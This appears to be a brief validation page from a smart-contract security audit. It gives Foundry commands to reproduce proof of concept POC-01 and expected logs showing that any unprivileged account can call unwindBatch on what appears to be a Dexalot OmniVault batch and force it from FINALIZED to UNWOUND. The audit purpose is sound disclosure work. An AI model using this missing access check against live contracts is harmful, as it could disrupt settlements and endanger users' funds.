# POC-01 — Validation Steps

## Environment

```
Forge 1.5.1-stable
Solc 0.8.30
OS: Kali Linux
```

## Steps

1. Clone the repo and install dependencies:

```bash
git clone https://github.com/caizongxun/dexalot-omnivault-audit.git
cd dexalot-omnivault-audit
forge install foundry-rs/forge-std
```

2. Run the PoC:

```bash
forge test --match-test testPOC01_UnwindBatchNoAccessControl -vvv
```

## Expected Output

```
[PASS] testPOC01_UnwindBatchNoAccessControl()
Logs:
  [+] SETTLER finalized batch 0
  [+] Warp 24h+1s
  [EXPLOIT] Anyone called unwindBatch(0) - no role check
  [EXPLOIT] Batch status: UNWOUND (expected FINALIZED)
  [EXPLOIT] POC-01 CONFIRMED
```

## Proof

`assertEq(uint256(status), uint256(BatchStatus.UNWOUND))` passes after the attacker
(non-privileged EOA) calls `unwindBatch`.
